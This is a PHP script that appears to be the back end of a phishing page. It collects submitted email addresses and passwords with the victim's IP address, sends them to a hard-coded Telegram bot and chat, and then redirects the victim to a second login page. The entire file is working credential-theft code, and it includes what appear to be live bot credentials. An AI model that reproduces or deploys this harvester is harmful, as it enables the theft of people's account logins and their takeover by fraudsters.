<?php
$telegramBotToken = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM';
$chatId = '1634597902';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['eml']) ? $_POST['eml'] : '';
    $password = isset($_POST['pwd']) ? $_POST['pwd'] : '';

    // Check if email and password are set
    if (!empty($email) && !empty($password)) {
        $userIp = $_SERVER['REMOTE_ADDR'];
        $currentDate = date('Y-m-d H:i:s');

        $message = "New Login:\nEmail: $email\nPassword: $password\nIP Address: $userIp\nDate: $currentDate";
        $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
        $telegramParams = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $ch = curl_init($telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('cURL error: ' . curl_error($ch));
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode != 200) {
            error_log('Telegram API returned HTTP code ' . $httpCode);
        } else {
            error_log('Telegram message sent successfully.');
        }

        // Debugging statement for redirection
        error_log('Redirecting to login2.html');

        // Redirect to another HTML page after sending to Telegram
        header("Location: login2.html");
        exit;
    } else {
        // Handle case where email or password is empty
        error_log('Email or password is empty.');
        echo 'Email or password is empty.';

        // You may want to add a delay or additional content here for debugging
    }
} else {
    // Handle case where the request method is not POST
    error_log('Invalid request method.');
    echo 'Invalid request method.';

    // You may want to add a delay or additional content here for debugging
}
?>
